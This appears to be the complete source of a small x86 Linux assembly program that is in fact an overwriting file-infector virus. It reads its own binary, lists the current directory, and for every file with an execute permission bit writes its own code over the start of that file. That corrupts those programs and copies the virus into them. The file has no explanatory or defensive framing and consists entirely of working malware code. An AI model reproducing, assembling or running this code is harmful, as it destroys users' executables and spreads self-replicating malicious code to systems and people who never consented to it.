section .data
	dir_name db '.',0
section .bss
	self_len resd 1
	st_buf resb 64
	self_buf resb 1024
	dir_buf resb 4096
section .text
	global _start
_start:
	;openself
	pop ebx
	pop ebx
	mov eax,5
	xor ecx,ecx
	int 80h
	
	;fstatself
	mov ebx,eax
	mov ecx,st_buf
	mov eax,108
	int 80h
	
	;readlen
	mov edx,dword[st_buf+20]
	mov dword[self_len],edx
	
	;readself
	mov eax,3
	mov ecx,self_buf
	int 80h
	
	;closeself
	mov eax,6
	int 80h
	
	;opendir
	mov eax,5
	mov ebx,dir_name
	xor ecx,ecx
	int 80h
	
	;readdir
	mov ebx,eax
	mov eax,141
	mov ecx,dir_buf
	mov edx,4096
	int 80h
	
	;closedir
	mov eax,6
	int 80h
	
	mov esi,dir_buf
_infect:
	movzx edi,word[esi+8]
	test edi,edi
	jz _exit
	mov ebx,esi
	add ebx,10
	add esi,edi
	
	;stathost
	mov eax,106
	mov ecx,st_buf
	int 80h
	movzx edx,word[st_buf+8]
	and edx,49h
	test edx,edx
	jz _infect
	
	;openhost
	mov eax,5
	mov ecx,1
	xor edx,edx
	int 80h
	cmp eax,0
	jle _infect
	
	;writehost
	mov ebx,eax
	mov eax,4
	mov ecx,self_buf
	mov edx,dword[self_len]
	int 80h

	;closehost
	mov eax,6
	int 80h
	
	jmp _infect
_exit:
	mov eax,1
	xor ebx,ebx
	int 80h
